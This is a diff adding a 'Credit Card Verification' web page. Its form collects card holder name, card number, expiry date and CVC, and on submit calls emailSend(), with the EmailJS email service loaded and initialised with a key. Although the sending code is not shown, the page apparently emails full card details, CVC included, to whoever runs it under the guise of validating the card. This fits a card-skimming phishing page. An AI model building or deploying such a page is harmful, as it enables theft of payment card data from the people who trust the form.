@@ -1,0 +1,126 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Credit Card Verification</title>
+    
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
+      rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/main.css">
+    <script defer src="assets/js/app.js">
+    </script>
+</head>
+<body>
+    
+     <!-- Navigation bar-->
+    <nav class="menu-container">
+  <!-- burger menu -->
+  <input type="checkbox" aria-label="Toggle menu" />
+  <span></span>
+  <span></span>
+  <span></span>
+
+  <!-- logo -->
+  <a href="#" class="menu-logo">
+    <img src="assets/images/logo.jpg" alt="My Awesome Website"/>
+  </a>
+
+  <!-- menu items -->
+  <div class="menu">
+    <ul>
+      <li>
+        <a href="index.html">
+          Home
+        </a>
+      </li>
+     
+      <li>
+        <a href="form.html">
+          Validate
+        </a>
+      </li>
+    </ul>
+  </div>
+</nav>
+    <!-- End Navigation Bar-->
+    
+    <div class="pagination">
+        <a href="index.html">Home</a>
+        <span>/</span>
+        <a href="form.html" class="active">Validation</a>
+    </div>
+    
+    <!-- ===== CARD VALIDATION FORM===== -->
+    
+    
+    <div class="form">
+        <h2>Validation</h2>
+        
+        <form onsubmit="emailSend(); reset(); return false;">
+      <div class="card space">
+        <label for="name">Card holder:</label>
+        <input type="text" id="name" class="input" placeholder="John Doe" required>
+        <span class="material-icons">
+account_circle
+</span>
+      </div>
+      <div class="card space">
+        <label for="number">Card number:</label>
+        <input type="text" id="number" class="input" data-mask="0000 0000 0000 0000" onkeyup="update(this.value)" placeholder="Card Number" required>
+        <span class="material-icons">
+credit_card
+</span>
+
+        <img id="img" style="padding:5px;" />
+      </div>
+      <div class="card-grp space">
+        <div class="card-item">
+          <label for="date">Expiry date:</label>
+          <input type="text" name="expiry-data" id="date" class="input" data-mask="00 / 00"  placeholder="00 / 00" required>
+          <span class="material-icons">
+calendar_month
+</span>
+        </div>
+        <div class="card-item ">
+          <label for="cvc">CVC:</label>
+          <input type="text" id="cvc" class="input" data-mask="000" placeholder="000" required>
+          <span class="material-icons">
+lock
+</span>
+        </div>
+      </div>
+        
+      <button type="submit" class="btn">
+        Validate <span class="material-icons">
+check_circle
+</span>      
+      </button>       
+      
+      
+      <span style="background-color: transparent;" id="valid"></span>
+    </div>
+  </div>
+  </form>
+</div>
+
+<!-- ##### SCRIPTS (JS) -->
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "SLkfwToVgD8iRYTKT",
+      });
+   })();
+</script>
+</script>
+	<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+	
+	
+</body>
+</html>
